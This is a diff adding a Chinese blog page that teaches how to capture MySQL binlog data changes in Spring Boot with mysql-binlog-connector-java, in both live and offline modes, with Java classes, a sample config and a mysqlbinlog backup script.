@@ -1,0 +1,1033 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>spring boot使用mysql-binlog-connector-java解析mysql binlog日志（实时&#43;离线） - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">spring boot使用mysql-binlog-connector-java解析mysql binlog日志（实时&#43;离线）</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+        
+                <div id="content_views" class="htmledit_views">
+                    <p>         mysql数据变更捕获的实现已经有很多开源工具，比如canal,debezium,maxwell等等。alibaba/canal实现了mysql连接协议，debezium和maxwell等则是利用mysql-binlog-connector-java开源工具连接mysql数据源，实现获取binlog日志。本篇文章介绍通过引入mysql-binlog-connector-java依赖，提供在线（即连接数据源，实时获取）和离线（读取离线文件）两种方式获取，解析binlog日志（利用mysql-binlog-connector-java的事件解析数据表增删改操作DML）。</p> 
+<p>话不多说，直接上代码。</p> 
+<p>BinLogConstants类主要提供目标数据库的连接信息，也包括解析模式选择（在线or离线）。</p> 
+<pre><code class="language-java">package com.binlog.parser;
+
+import lombok.Data;
+import org.springframework.beans.factory.annotation.Value;
+import org.springframework.stereotype.Component;
+
+/**
+ * 监听配置信息
+ *
+ * @author lgq
+ * @since 2022/7/27
+ **/
+@Data
+@Component
+public class BinLogConstants {
+    @Value("${binlog.datasource.host}")
+    private String host;
+
+    @Value("${binlog.datasource.port}")
+    private int port;
+
+    @Value("${binlog.datasource.username}")
+    private String username;
+
+    @Value("${binlog.datasource.passwd}")
+    private String passwd;
+
+    @Value("${binlog.db}")
+    private String db;
+
+    @Value("${binlog.table}")
+    private String table;
+
+    @Value("${binlog.isOnline}")
+    private boolean isOnline;
+
+    public static final int consumerThreads = 4;
+
+    public static final int fileScanThreads = 4;
+
+    public static final long queueSleep = 1000;
+
+}
+</code></pre> 
+<pre>BinLogListener类注册消费监听器，提供事件解析方法，并启动消费线程。</pre> 
+<pre><code class="language-java">package com.binlog.parser;
+
+import java.io.Serializable;
+import java.util.Map;
+import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.BlockingQueue;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
+import com.github.shyiko.mysql.binlog.event.DeleteRowsEventData;
+import com.github.shyiko.mysql.binlog.event.Event;
+import com.github.shyiko.mysql.binlog.event.EventType;
+import com.github.shyiko.mysql.binlog.event.QueryEventData;
+import com.github.shyiko.mysql.binlog.event.TableMapEventData;
+import com.github.shyiko.mysql.binlog.event.UpdateRowsEventData;
+import com.github.shyiko.mysql.binlog.event.WriteRowsEventData;
+import com.google.common.collect.ArrayListMultimap;
+import com.google.common.collect.Multimap;
+
+import static com.github.shyiko.mysql.binlog.event.EventType.QUERY;
+import static com.github.shyiko.mysql.binlog.event.EventType.isDelete;
+import static com.github.shyiko.mysql.binlog.event.EventType.isUpdate;
+import static com.github.shyiko.mysql.binlog.event.EventType.isWrite;
+
+/**
+ * binlog日志监听器
+ *
+ * @author lgq
+ * @since 2022/7/21
+ **/
+public abstract class BinLogListener {
+    private final int consumerThreads = BinLogConstants.consumerThreads;
+    private final BlockingQueue&lt;BinLogItem&gt; binLogItemQueue;
+    private final ExecutorService consumer;
+    // 存放每张数据表对应的listener
+    private final Multimap&lt;String, BinLogConsumerListener&gt; listeners;
+    private final MysqlConnConf mysqlConnConf;
+    private final Map&lt;String, Map&lt;String, ColumnInfo&gt;&gt; dbTableCols;
+    private String dbTable;
+
+    /**
+     * 监听器初始化
+     *
+     * @param conf
+     */
+    public BinLogListener(MysqlConnConf conf) {
+        this.binLogItemQueue = new ArrayBlockingQueue&lt;&gt;(1024);
+        this.mysqlConnConf = conf;
+        this.listeners = ArrayListMultimap.create();
+        this.dbTableCols = new ConcurrentHashMap&lt;&gt;();
+        this.consumer = Executors.newFixedThreadPool(consumerThreads);
+    }
+
+    /**
+     * 注册消费监听
+     *
+     * @param db       数据库
+     * @param table    操作表
+     * @param listener 监听器
+     * @throws Exception
+     */
+    public void regConsumerListener(String db, String table, BinLogConsumerListener listener) throws Exception {
+        String dbTable = BinLogUtils.getDBTable(db, table);
+        // 获取字段集合
+        Map&lt;String, ColumnInfo&gt; cols = BinLogUtils.getColMap(mysqlConnConf, db, table);
+        // 保存字段信息
+        dbTableCols.put(dbTable, cols);
+        // 保存当前注册的listener
+        listeners.put(dbTable, listener);
+    }
+
+    /**
+     * 读取日志解析并启动多线程消费
+     *
+     */
+    public void consume() {
+        consumer.submit(() -&gt; {
+            while (true) {
+                if (binLogItemQueue.size() &gt; 0) {
+                    try {
+                        BinLogItem item = binLogItemQueue.take();
+                        String dbTable = item.getDbTable();
+                        listeners.get(dbTable).forEach(binLogListener -&gt; binLogListener.onEvent(item));
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
+                Thread.sleep(BinLogConstants.queueSleep);
+            }
+        });
+    }
+
+    public void parseEvent(Event event) {
+        EventType eventType = event.getHeader().getEventType();
+        if (eventType == QUERY) {
+            QueryEventData data = event.getData();
+            System.out.println(data.getSql());
+        }
+
+        if (eventType == EventType.TABLE_MAP) {
+            TableMapEventData tableData = event.getData();
+            String db = tableData.getDatabase();
+            String table = tableData.getTable();
+            dbTable = BinLogUtils.getDBTable(db, table);
+        }
+
+        // 只处理添加删除更新三种操作
+        if (isWrite(eventType) || isUpdate(eventType) || isDelete(eventType)) {
+            if (isWrite(eventType)) {
+                WriteRowsEventData data = event.getData();
+                for (Serializable[] row : data.getRows()) {
+                    if (dbTableCols.containsKey(dbTable)) {
+                        BinLogItem item = BinLogItem.itemFromInsertOrDeleted(row, dbTableCols.get(dbTable),
+                                eventType, event.getHeader().getTimestamp());
+                        item.setDbTable(dbTable);
+                        binLogItemQueue.add(item);
+                    }
+                }
+            }
+            if (isUpdate(eventType)) {
+                UpdateRowsEventData data = event.getData();
+                for (Map.Entry&lt;Serializable[], Serializable[]&gt; row : data.getRows()) {
+                    if (dbTableCols.containsKey(dbTable)) {
+                        BinLogItem item = BinLogItem.itemFromUpdate(row, dbTableCols.get(dbTable),
+                                eventType, event.getHeader().getTimestamp());
+                        item.setDbTable(dbTable);
+                        binLogItemQueue.add(item);
+                    }
+                }
+
+            }
+            if (isDelete(eventType)) {
+                DeleteRowsEventData data = event.getData();
+                for (Serializable[] row : data.getRows()) {
+                    if (dbTableCols.containsKey(dbTable)) {
+                        BinLogItem item = BinLogItem.itemFromInsertOrDeleted(row, dbTableCols.get(dbTable),
+                                eventType, event.getHeader().getTimestamp());
+                        item.setDbTable(dbTable);
+                        binLogItemQueue.add(item);
+                    }
+                }
+            }
+        }
+    }
+
+    public abstract void startParseBinLog();
+
+}
+
+</code></pre> 
+<pre>OnlineBinLogListener类通过BinaryLogClient开启连接远程实时拉取binlog日志。</pre> 
+<pre><code class="language-java">package com.binlog.parser;
+
+import java.io.IOException;
+
+import com.github.shyiko.mysql.binlog.BinaryLogClient;
+import com.github.shyiko.mysql.binlog.event.Event;
+import com.github.shyiko.mysql.binlog.event.deserialization.EventDeserializer;
+
+import lombok.extern.slf4j.Slf4j;
+
+/**
+ * 数据库监听器
+ *
+ * @author lgq
+ * @since 2022/7/21
+ **/
+@Slf4j
+public class OnlineBinLogListener extends BinLogListener implements BinaryLogClient.EventListener {
+    private final BinaryLogClient parseClient;
+
+    /**
+     * 监听器初始化
+     *
+     * @param conf
+     */
+    public OnlineBinLogListener(MysqlConnConf conf) {
+        super(conf);
+        BinaryLogClient client = new BinaryLogClient(conf.getHost(), conf.getPort(), conf.getUsername(), conf.getPasswd());
+        EventDeserializer eventDeserializer = new EventDeserializer();
+        /*
+        eventDeserializer.setCompatibilityMode( //序列化
+                EventDeserializer.CompatibilityMode.DATE_AND_TIME_AS_LONG,
+                EventDeserializer.CompatibilityMode.CHAR_AND_BINARY_AS_BYTE_ARRAY
+        );
+         */
+        client.setEventDeserializer(eventDeserializer);
+        this.parseClient = client;
+    }
+
+    /**
+     * 监听处理
+     *
+     * @param event
+     */
+    @Override
+    public void onEvent(Event event) {
+        parseEvent(event);
+    }
+
+    @Override
+    public void startParseBinLog() {
+        // 先启动消费线程
+        consume();
+        parseClient.registerEventListener(this);
+        // 连接数据库，开始拉取binlog日志（没有过滤库，表信息）
+        try {
+            parseClient.connect();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+
+</code></pre> 
+<pre>OfflineBinLogListener实时获取指定目录中新增的完整的binlog文件（默认为500m）进行离线解析。</pre> 
+<pre><code class="language-java">package com.binlog.parser;
+
+import java.io.File;
+import java.io.IOException;
+import java.util.concurrent.BlockingQueue;
+import java.util.concurrent.ExecutorService;
+
+import javax.annotation.Resource;
+
+import com.github.shyiko.mysql.binlog.BinaryLogFileReader;
+import com.github.shyiko.mysql.binlog.event.Event;
+import com.github.shyiko.mysql.binlog.event.deserialization.EventDeserializer;
+import com.binlog.config.FileProperties;
+import com.binlog.util.SpringUtil;
+
+import lombok.extern.slf4j.Slf4j;
+
+/**
+ * 数据库监听器
+ *
+ * @author lgq
+ * @since 2022/7/21
+ **/
+@Slf4j
+public class OfflineBinLogListener extends BinLogListener {
+    private MysqlBinLogReader mysqlBinLogReader;
+
+    private FileProperties fileProperties;
+
+    /**
+     * 监听器初始化
+     *
+     * @param conf
+     */
+    public OfflineBinLogListener(MysqlConnConf conf) {
+       super(conf);
+       this.mysqlBinLogReader = (MysqlBinLogReader)SpringUtil.getApplicationContext().getBean("mysqlBinLogReader");
+       this.fileProperties = (FileProperties)SpringUtil.getApplicationContext().getBean("fileProperties");
+    }
+
+    public OfflineBinLogListener(MysqlConnConf conf, MysqlBinLogReader mysqlBinLogReader,
+                                 FileProperties fileProperties) {
+        super(conf);
+        this.mysqlBinLogReader = mysqlBinLogReader;
+        this.fileProperties = fileProperties;
+    }
+
+    @Override
+    public void startParseBinLog() {
+        // 先启动消费线程
+        consume();
+        BlockingQueue&lt;String&gt; fileNameQueue = mysqlBinLogReader.getFileNameQueue();
+        ExecutorService offlineFileProcess = mysqlBinLogReader.getOfflineFileProcess();
+        offlineFileProcess.submit(() -&gt; {
+            Thread.currentThread().setName("scanBinLogFileConsumer");
+            while (true) {
+                if (!fileNameQueue.isEmpty()) {
+                    String fileName;
+                    try {
+                        fileName = fileNameQueue.take();
+                        File binlogFile = new File(fileProperties.getLocalBackupDir(), fileName);
+                        EventDeserializer eventDeserializer = new EventDeserializer();
+
+                        BinaryLogFileReader reader = new BinaryLogFileReader(binlogFile, eventDeserializer);
+                        for (Event event; (event = reader.readEvent()) != null; ) {
+                            parseEvent(event);
+                        }
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+
+                }
+            }
+        });
+    }
+
+}
+
+</code></pre> 
+<pre>BinLogListenerStarter监听启动器注册指定的库，表监听器，并启动日志解析和消费线程。</pre> 
+<pre><code class="language-java">package com.binlog.parser;
+
+import lombok.extern.slf4j.Slf4j;
+import org.springframework.boot.CommandLineRunner;
+import org.springframework.core.annotation.Order;
+import org.springframework.stereotype.Component;
+
+import javax.annotation.Resource;
+import java.util.List;
+import java.util.Objects;
+
+
+/**
+ * 测试监听器
+ * SpringBoot启动成功后的执行业务线程操作
+ * CommandLineRunner去实现此操作
+ * 在有多个可被执行的业务时，通过使用 @Order 注解，设置各个线程的启动顺序（value值由小到大表示启动顺序）。
+ * 多个实现CommandLineRunner接口的类必须要设置启动顺序，不然程序启动会报错！
+ *
+ * @author lgq
+ * @since 2022/7/21
+ **/
+@Slf4j
+@Component
+@Order(value = 1)
+public class BinLogListenerStarter implements CommandLineRunner {
+
+    @Resource
+    private BinLogConstants binLogConstants;
+
+    @Override
+    public void run(String... args) throws Exception {
+        log.info("初始化配置信息：" + binLogConstants.toString());
+
+        // 初始化配置信息
+        MysqlConnConf conf = new MysqlConnConf(binLogConstants.getHost(), binLogConstants.getPort(),
+                binLogConstants.getUsername(), binLogConstants.getPasswd());
+
+        // 初始化监听器
+        BinLogListener binLogListener;
+        if (binLogConstants.isOnline()) {
+            binLogListener = new OnlineBinLogListener(conf);
+        } else {
+            binLogListener = new OfflineBinLogListener(conf);
+        }
+
+        // 获取table集合
+        List&lt;String&gt; tableList = BinLogUtils.getListByStr(binLogConstants.getTable());
+        if (Objects.isNull(tableList) || tableList.size() == 0) {
+            return;
+        }
+        // 注册监听
+        tableList.forEach(table -&gt; {
+            log.info("注册监听信息，注册DB：{}, 注册表：{}", binLogConstants.getDb(), table);
+            try {
+                binLogListener.regConsumerListener(binLogConstants.getDb(), table, item -&gt; {
+                    log.info("监听逻辑处理:打印一下数据变更信息： {}", item.toString());
+                });
+            } catch (Exception e) {
+                log.error("BinLog监听异常：{}", e);
+            }
+        });
+        // 开启日志获取和解析业务线程
+        binLogListener.startParseBinLog();
+    }
+}
+
+</code></pre> 
+<pre>ColumnInfo存储表字段信息。</pre> 
+<pre><code class="language-java">package com.binlog.parser;
+
+import lombok.Data;
+
+/**
+ * 字段属性对象
+ *
+ * @author lgq
+ * @since 2022/7/21
+ **/
+@Data
+public class ColumnInfo {
+    public int inx;
+    public String colName; // 列名
+    public String dataType; // 类型
+    public String schema; // 数据库
+    public String table; // 表
+    public boolean isPKC; //是否主键
+
+    public ColumnInfo(String schema, String table, int idx, String colName, String dataType, boolean isPKC) {
+        this.schema = schema;
+        this.table = table;
+        this.colName = colName;
+        this.dataType = dataType;
+        this.inx = idx;
+        this.isPKC = isPKC;
+    }
+}
+</code></pre> 
+<pre>BinLogItem存储解析日志获得的结构化数据。</pre> 
+<pre><code class="language-java">package com.binlog.parser;
+
+import java.io.Serializable;
+import java.util.HashMap;
+import java.util.Map;
+
+import com.github.shyiko.mysql.binlog.event.EventType;
+import com.google.common.collect.Maps;
+
+import lombok.Data;
+
+import static com.github.shyiko.mysql.binlog.event.EventType.isDelete;
+import static com.github.shyiko.mysql.binlog.event.EventType.isWrite;
+
+/**
+ * binlog对象
+ *
+ * @author lgq
+ * @since 2021/7/26
+ **/
+@Data
+public class BinLogItem implements Serializable {
+    private static final long serialVersionUID = 1L;
+
+    private String dbTable;
+    private EventType eventType;
+    private Long timestamp = null;
+    private Long serverId = null;
+    // 存储字段-之前的值之后的值
+    private Map&lt;String, Serializable&gt; before = null;
+    private Map&lt;String, Serializable&gt; after = null;
+    // 存储字段--类型
+    private Map&lt;String, ColumnInfo&gt; columnInfoMap = null;
+    // json格式的数据变更信息
+    private Map&lt;String, Object&gt; messageJson = new HashMap&lt;&gt;();
+
+    /**
+     * 新增或者删除操作数据格式化
+     */
+    public static BinLogItem itemFromInsertOrDeleted(Serializable[] row, Map&lt;String, ColumnInfo&gt; columnInfoMap,
+                                                     EventType eventType, Long timestamp) {
+        if (null == row || null == columnInfoMap) {
+            return null;
+        }
+       /* if (row.length != columnInfoMap.size()) {
+            return null;
+        }*/
+        // 初始化Item
+        BinLogItem item = new BinLogItem();
+        item.eventType = eventType;
+        item.columnInfoMap = columnInfoMap;
+        item.before = Maps.newHashMap();
+        item.after = Maps.newHashMap();
+        item.timestamp = timestamp;
+
+        // json预设主键
+        item.messageJson.put("pkc", null);
+
+        Map&lt;String, Serializable&gt; beOrAf = Maps.newHashMap();
+        columnInfoMap.entrySet().forEach(entry -&gt; {
+            String key = entry.getKey();
+            ColumnInfo columnInfo = entry.getValue();
+            beOrAf.put(key, row[columnInfo.inx]);
+            if (columnInfo.isPKC) {
+                // json设置主键
+                item.messageJson.put("pkc", key);
+            }
+        });
+
+        // 写操作放after，删操作放before
+        if (isWrite(eventType)) {
+            item.after = beOrAf;
+        }
+        if (isDelete(eventType)) {
+            item.before = beOrAf;
+        }
+
+        // 构造json格式的数据变更信息
+        item.messageJson.put("op", Operator.valueOf(eventType));
+        item.messageJson.put("ts", item.timestamp);
+        item.messageJson.put("before", item.before);
+        item.messageJson.put("after", item.after);
+
+        return item;
+    }
+
+    /**
+     * 更新操作数据格式化
+     */
+    public static BinLogItem itemFromUpdate(Map.Entry&lt;Serializable[], Serializable[]&gt; mapEntry, Map&lt;String, ColumnInfo&gt; columnInfoMap,
+                                            EventType eventType, Long timestamp) {
+        if (null == mapEntry || null == columnInfoMap) {
+            return null;
+        }
+        // 初始化Item
+        BinLogItem item = new BinLogItem();
+        item.eventType = eventType;
+        item.columnInfoMap = columnInfoMap;
+        item.before = Maps.newHashMap();
+        item.after = Maps.newHashMap();
+        item.timestamp = timestamp;
+        // json预设主键
+        item.messageJson.put("pkc", null);
+
+        Map&lt;String, Serializable&gt; be = Maps.newHashMap();
+        Map&lt;String, Serializable&gt; af = Maps.newHashMap();
+
+        columnInfoMap.entrySet().forEach(entry -&gt; {
+            String key = entry.getKey();
+            ColumnInfo columnInfo = entry.getValue();
+            be.put(key, mapEntry.getKey()[columnInfo.inx]);
+            af.put(key, mapEntry.getValue()[columnInfo.inx]);
+            if (columnInfo.isPKC) {
+                // json设置主键
+                item.messageJson.put("pkc", key);
+            }
+        });
+
+        item.before = be;
+        item.after = af;
+
+        /*
+        * 构造json格式的数据变更信息
+        */
+        item.messageJson.put("op", Operator.valueOf(eventType));
+        item.messageJson.put("ts", item.timestamp);
+        item.messageJson.put("before", item.before);
+        item.messageJson.put("after", item.after);
+
+        return item;
+    }
+
+    @Override
+    public String toString() {
+        return messageJson.toString();
+    }
+
+}
+
+</code></pre> 
+<pre>BinLogUtils提供一些工具类方法供解析时使用。</pre> 
+<pre><code class="language-java">package com.binlog.parser;
+
+import com.github.shyiko.mysql.binlog.event.EventType;
+import com.google.common.collect.Lists;
+import lombok.extern.slf4j.Slf4j;
+import org.springframework.stereotype.Component;
+
+import javax.annotation.PostConstruct;
+
+import java.io.Serializable;
+import java.sql.*;
+import java.util.Arrays;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
+import java.util.Objects;
+
+import static com.github.shyiko.mysql.binlog.event.EventType.isDelete;
+import static com.github.shyiko.mysql.binlog.event.EventType.isUpdate;
+import static com.github.shyiko.mysql.binlog.event.EventType.isWrite;
+
+/**
+ * 监听工具
+ *
+ * @author lgq
+ * @since 2021/7/27
+ **/
+@Slf4j
+@Component
+public class BinLogUtils {
+
+    private static BinLogUtils binLogUtils;
+
+    @PostConstruct
+    public void init() {
+        binLogUtils = this;
+    }
+
+    /**
+     * 拼接dbTable
+     */
+    public static String getDBTable(String db, String table) {
+        return db + "-" + table;
+    }
+
+    /**
+     * 获取columns集合
+     */
+    public static Map&lt;String, ColumnInfo&gt; getColMap(MysqlConnConf conf, String db, String table) throws ClassNotFoundException {
+        try {
+            Class.forName("com.mysql.jdbc.Driver");
+            // 保存当前注册的表的column信息
+            Connection connection = DriverManager.getConnection("jdbc:mysql://" + conf.getHost() + ":"
+                    + conf.getPort(), conf.getUsername(), conf.getPasswd());
+            // 执行sql
+            String preSql = "SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, " +
+                    "DATA_TYPE, ORDINAL_POSITION, case when COLUMN_KEY = 'PRI' THEN 'Y' ELSE 'N' END IS_PKC" +
+                    " FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = ? and TABLE_NAME = ?";
+            PreparedStatement ps = connection.prepareStatement(preSql);
+            ps.setString(1, db);
+            ps.setString(2, table);
+            ResultSet rs = ps.executeQuery();
+            Map&lt;String, ColumnInfo&gt; map = new HashMap&lt;&gt;(rs.getRow());
+            while (rs.next()) {
+                String schema = rs.getString("TABLE_SCHEMA");
+                String tableName = rs.getString("TABLE_NAME");
+                String column = rs.getString("COLUMN_NAME");
+                int idx = rs.getInt("ORDINAL_POSITION");
+                String dataType = rs.getString("DATA_TYPE");
+                String isPKC = rs.getString("IS_PKC");
+                if (column != null &amp;&amp; idx &gt;= 1) {
+                    map.put(column, new ColumnInfo(schema, tableName, idx - 1, column, dataType,
+                            "Y".equals(isPKC))); // sql的位置从1开始
+                }
+            }
+            ps.close();
+            rs.close();
+            return map;
+        } catch (SQLException e) {
+            log.error("load db conf error, db_table={}:{} ", db, table, e);
+        }
+        return null;
+    }
+
+    /**
+     * 根据DBTable获取table
+     *
+     * @param dbTable
+     * @return java.lang.String
+     */
+    public static String getTable(String dbTable) {
+        if (Objects.isNull(dbTable)) {
+            return "";
+        }
+        String[] split = dbTable.split("-");
+        if (split.length == 2) {
+            return split[1];
+        }
+        return "";
+    }
+
+    /**
+     * 将逗号拼接字符串转List
+     *
+     * @param str
+     * @return
+     */
+    public static List&lt;String&gt; getListByStr(String str) {
+        if (Objects.isNull(str)) {
+            return Lists.newArrayList();
+        }
+
+        return Arrays.asList(str.split(","));
+    }
+
+    /**
+     * 根据操作类型获取对应集合
+     *
+     * @param binLogItem
+     * @return
+     */
+    public static Map&lt;String, Serializable&gt; getOptMap(BinLogItem binLogItem) {
+        // 获取操作类型
+        EventType eventType = binLogItem.getEventType();
+        if (isWrite(eventType) || isUpdate(eventType)) {
+            return binLogItem.getAfter();
+        }
+        if (isDelete(eventType)) {
+            return binLogItem.getBefore();
+        }
+        return null;
+    }
+
+    /**
+     * 获取操作类型
+     *
+     * @param binLogItem
+     * @return
+     */
+    public static Integer getOptType(BinLogItem binLogItem) {
+        // 获取操作类型
+        EventType eventType = binLogItem.getEventType();
+        if (isWrite(eventType)) {
+            return 1;
+        }
+        if (isUpdate(eventType)) {
+            return 2;
+        }
+        if (isDelete(eventType)) {
+            return 3;
+        }
+        return null;
+    }
+
+}
+
+</code></pre> 
+<pre>MysqlBinLogReader初始化并启动扫描指定目录下binlog日志的线程。</pre> 
+<pre><code class="language-java">package com.binlog.parser;
+
+import java.util.TreeMap;
+import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.BlockingQueue;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
+import javax.annotation.Resource;
+
+import com.binlog.config.FileProperties;
+import com.binlog.util.FileInfoUtil;
+
+import lombok.Data;
+import org.springframework.stereotype.Component;
+
+/**
+ * @author lgq
+ * @since 2022/7/21
+ */
+@Component
+@Data
+public class MysqlBinLogReader {
+    private final int fileScanThreads = 4;
+
+    private final ExecutorService offlineFileProcess;
+
+    private final BlockingQueue&lt;String&gt; fileNameQueue;
+
+    @Resource
+    private FileProperties fileProperties;
+
+    public MysqlBinLogReader(){
+        this.offlineFileProcess = Executors.newFixedThreadPool(fileScanThreads);
+        this.fileNameQueue = new ArrayBlockingQueue&lt;&gt;(1024);
+    }
+
+    public MysqlBinLogReader(FileProperties fileProperties){
+        this.offlineFileProcess = Executors.newFixedThreadPool(fileScanThreads);
+        this.fileNameQueue = new ArrayBlockingQueue&lt;&gt;(1024);
+        this.fileProperties = fileProperties;
+    }
+
+    public void scanBinLogFile() {
+        offlineFileProcess.submit(() -&gt; {
+            Thread.currentThread().setName("scanBinLogFileProducer");
+            while (true) {
+                TreeMap&lt;Long, String&gt; newBinLogFilesPath = FileInfoUtil.getNewBinLogFilesPath(
+                        fileProperties.getLocalBackupDir(), fileProperties.getBackupLogName(),
+                        fileProperties.getLastFileName());
+                newBinLogFilesPath.forEach((createTime, fileName) -&gt; {
+                    fileNameQueue.add(fileName);
+                });
+                if (newBinLogFilesPath.size() &gt; 0) {
+                    fileProperties.setLastFileName(newBinLogFilesPath.lastEntry().getValue());
+                }
+            }
+        });
+    }
+}
+</code></pre> 
+<pre>FileInfoUtil提供一些文件扫描的工具类，比如获取指定目录下新增的binlog日志文件（该文件确定已经写入完成，后面mysql的binlog日志是写入新的日志文件）。
+</pre> 
+<pre><code class="language-java">package com.binlog.util;
+
+import java.io.File;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.attribute.BasicFileAttributes;
+import java.util.TreeMap;
+
+public class FileInfoUtil {
+    public static TreeMap&lt;Long, String&gt; getNewBinLogFilesPath(String localBackupDir,
+                                                          String backupLogName,
+                                                          String lastLogPath) throws IOException {
+        //treeMap默认根据字典序排序，时间小的在前面
+        TreeMap&lt;Long, String&gt; newBinLogFileMap = new TreeMap&lt;&gt;();
+        File dir = new File(localBackupDir);
+        Long lastFileCreateTime = 0L;
+        if (!ObjectsUtil.isEmpty(lastLogPath)) {
+            File lastFile = new File(lastLogPath);
+            lastFileCreateTime = Files.readAttributes(lastFile.toPath(), BasicFileAttributes.class)
+                    .creationTime().toMillis();
+        }
+        String [] files = dir.list();
+        for (int i = 0; i &lt; files.length; i++) {
+            //排除日志文件
+            if (files[i].equals(backupLogName)) {
+                continue;
+            }
+            File file = new File(dir, files[i]);
+            //排除异常情况：目录
+            if (file.isDirectory()) {
+                continue;
+            }
+            long fileCreateTime = Files.readAttributes(file.toPath(), BasicFileAttributes.class).creationTime().toMillis();
+            if (fileCreateTime &gt; lastFileCreateTime) {
+                newBinLogFileMap.put(fileCreateTime, files[i]);
+            }
+        }
+        return newBinLogFileMap;
+    }
+}
+</code></pre> 
+<pre>FilesScanStarter开启文件扫描线程，捕获新增的日志文件。</pre> 
+<pre><code class="language-java">package com.binlog.parser;
+
+import javax.annotation.Resource;
+
+import com.binlog.config.FileProperties;
+
+import lombok.extern.slf4j.Slf4j;
+import org.springframework.boot.CommandLineRunner;
+import org.springframework.core.annotation.Order;
+import org.springframework.stereotype.Component;
+
+/**
+ * @author lgq
+ * @since 2022/7/21
+ */
+@Slf4j
+@Order(value = 0)
+@Component
+public class FilesScanStarter implements CommandLineRunner {
+    @Resource
+    private MysqlBinLogReader mysqlBinLogReader;
+
+    @Override
+    public void run(String... args) {
+        mysqlBinLogReader.scanBinLogFile();
+    }
+}
+</code></pre> 
+<p>其他的配置文件如下。</p> 
+<pre><code class="language-java">package com.binlog.parser;
+
+import lombok.AllArgsConstructor;
+import lombok.Data;
+
+/**
+ * 数据库配置
+ *
+ * @author lgq
+ * @since 2022/7/21
+ **/
+@Data
+@AllArgsConstructor
+public class MysqlConnConf {
+    private String host;
+    private int port;
+    private String username;
+    private String passwd;
+}
+
+
+//application.yml文件
+/*
+server:
+  port: 8080
+
+binlog:
+  localBackupDir: E:backupbinlog
+  backupLog: E:backupbinlogbackuplog.txt
+  backupLogName: backuplog.txt
+  lastFileName:
+  table: abc
+  db: db1
+  isOnline: false
+
+  datasource:
+    host: 1.1.1.1
+    port: 3306
+    username: abc
+    passwd: 123456
+*/
+
+
+
+
+</code></pre> 
+<p>离线方式的指定目录文件获取方式有很多，比如scp,tfp等命令拷贝，或者直接通过mysql提供的mysqlbinlog命令实时拉取，最后给出mysqlbinlog远程实时拉取binlog日志的脚本。</p> 
+<pre><code class="language-bash">#!/bin/sh
+BACKUP_BIN=/usr/bin/mysqlbinlog
+LOCAL_BACKUP_DIR=/backup/binlog/
+BACKUP_LOG=/backup/binlog/backuplog
+REMOTE_HOST=1.1.1.1
+REMOTE_PORT=3306
+REMOTE_USER=abc
+REMOTE_PASS=123456
+FIRST_BINLOG=binlog.000001  
+#time to wait before reconnecting after failure
+SLEEP_SECONDS=10
+##create local_backup_dir if necessary
+mkdir -p ${LOCAL_BACKUP_DIR}
+cd ${LOCAL_BACKUP_DIR}
+## 运行while循环，连接断开后等待指定时间，重新连接
+while :
+do
+ if [ `ls -A "${LOCAL_BACKUP_DIR}" |wc -l` -eq 0 ];then
+ LAST_FILE=${FIRST_BINLOG}
+ else
+ LAST_FILE=`ls -l ${} | grep -v backuplog |tail -n 1 |awk '{print $9}'`
+ fi
+ ${BACKUP_BIN} --raw --read-from-remote-server --stop-never --host=${REMOTE_HOST} --port=${REMOTE_PORT} --user=${REMOTE_USER} --password=${REMOTE_PASS} ${LAST_FILE}
+ echo "`date +"%Y/%m/%d %H:%M:%S"` mysqlbinlog停止，返回代码：$?" | tee -a ${BACKUP_LOG}
+ echo "${SLEEP_SECONDS}秒后再次连接并继续备份" | tee -a ${BACKUP_LOG} 
+ sleep ${SLEEP_SECONDS}
+done</code></pre> 
+<p>本文介绍的解析过程（尤其是离线方式）有个问题，当数据表结构变更频繁（DDL）时会出现解析错误问题。（离线数据滞后，日志中的数据表结构可能与当前实际的数据表结构不一致，导致解析失败或数据解析错误），解决这个问题可以参考开源软件源代码的处理逻辑，比如maxwell。</p>
+                </div>
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
